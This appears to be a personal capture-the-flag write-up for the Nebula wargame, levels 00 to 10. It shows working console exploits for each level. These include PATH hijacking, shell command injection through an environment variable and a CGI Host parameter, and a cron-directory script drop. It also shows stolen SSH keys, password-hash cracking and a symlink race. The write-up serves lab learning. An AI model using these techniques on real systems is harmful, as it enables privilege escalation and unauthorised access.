Nebula Writeup
==============

## 00
```console
level00@nebula:~$ find / -nowarn -perm +04000 -user flag00 2> /dev/null 
/bin/.../flag00
/rofs/bin/.../flag00
level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:~$ /bin/getflag 
You have successfully executed getflag on a target account
```

## 01
```console
level01@nebula:~$ ln -s /bin/getflag echo
level01@nebula:~$ PATH=.:$PATH /home/flag01/flag01
You have successfully executed getflag on a target account
```

## 02
```console
level02@nebula:~$ USER="\`/bin/getflag\`" /home/flag02/flag02 
You have successfully executed getflag on a target account is coolo
```

## 03
```console
level03@nebula:~$ cat run.sh 
#!/bin/bash
/bin/getflag > /tmp/flag03.out
level03@nebula:~$ chmod +x run.sh 
level03@nebula:~$ cp run.sh ../flag03/writable.d/
level03@nebula:~$ watch ls -l  ../flag03/writable.d/ /tmp
level03@nebula:~$ more /tmp/flag03.out 
You have successfully executed getflag on a target account
```

### 04
```console
level04@nebula:~$ ln -s ../flag04/token link
level04@nebula:~$ ../flag04/flag04 link 
06508b5e-8909-4f38-b630-fdb148a848a2
```

## 05 
```console
ls -la ../flag05/
total 5
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
ls -la ../flag05/.backup:
total 2
-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
level05@nebula:~$ cp ../flag05/.backup/backup-19072011.tgz ./
level05@nebula:~$ tar xvf backup-19072011.tgz 
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:~$ ssh -i .ssh/id_rsa flag05@localhost
flag05@nebula:~$ getflag 
You have successfully executed getflag on a target account
```

## 06
```console
imac:run gwyn$ cat passwd
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
imac:run gwyn$ ./john passwd
Warning: detected hash type "descrypt", but the string is also recognized as "descrypt-opencl"
Use the "--format=descrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 256/256 AVX2-16])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hello            (flag06)
1g 0:00:00:00 DONE 2/3 (2018-04-01 12:36) 25.00g/s 425700p/s 425700c/s 425700C/s 123456..betabeta
Use the "--show" option to display all of the cracked passwords reliably
Session completed
...
level06@nebula:~$ su - flag06
Password: 
flag06@nebula:~$ getflag 
You have successfully executed getflag on a target account
```

## 07
```console
level07@nebula:~$ wget -O - http://127.0.0.1:7007/index.cgi?Host="-c 0 localhost | getflag"
--2018-04-03 14:18:19--  http://127.0.0.1:7007/index.cgi?Host=-c%200%20localhost%20%7C%20getflag
Connecting to 127.0.0.1:7007... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: `STDOUT'

    [<=>                                                       ] 0           --.-K/s              <html><head><title>Ping results</title></head><body><pre>You have successfully executed getflag on a target account
    [ <=>                                                      ] 136         --.-K/s   in 0.003s  

2018-04-03 14:18:19 (50.8 KB/s) - written to stdout [136]
```

## 08
Locate the pcap capture file, copy it off to a system where you can run Wireshark on it.

Within Wireshark, follow the TCP stream, although you'll need to switch "Show data as" to "Hex Dump" to see that the '.'s are 7f's, i.e. DELs
```console
level08@nebula:~$ su - flag08
Password: 
flag08@nebula:~$ getflag 
You have successfully executed getflag on a target account
flag08@nebula:~$ 
```

## 09
I skipped this one, after some initial investigations

## 10
This one's a "time-of-use to time-of-check" vulnerability and relies on swapping the target between the access check and the open calls.
My instinct is to try for a one-shot approach, but actually, the required info can be easiest obtained by having 3 processes going, as follows:
1. This is simply a network listener set to keep listening - `nc -lk 18211`
2. This is process continuously loops trying to read a target - `while true; do ../flag10/flag10 target 127.0.0.1; done`
3. While this process continuously swaps the target between pointing to an accessable file and the token file - `while true; do ln -sf dummy target; ln -sf ../flag10/token target; done` 
Quiet quickly, you should see the token on the console of process 1
```console
.oO Oo.
dummy
.oO Oo.
dummy
.oO Oo.
dummy
.oO Oo.
dummy
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
dummy
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
...
```

## nn
```console

```

## nn
```console

```

## nn
```console

```

## nn
```console

```

## nn
```console

```

## nn
```console

```

## nn
```console

```

## nn
```console

```

## nn
```console

```

## nn
```console

```

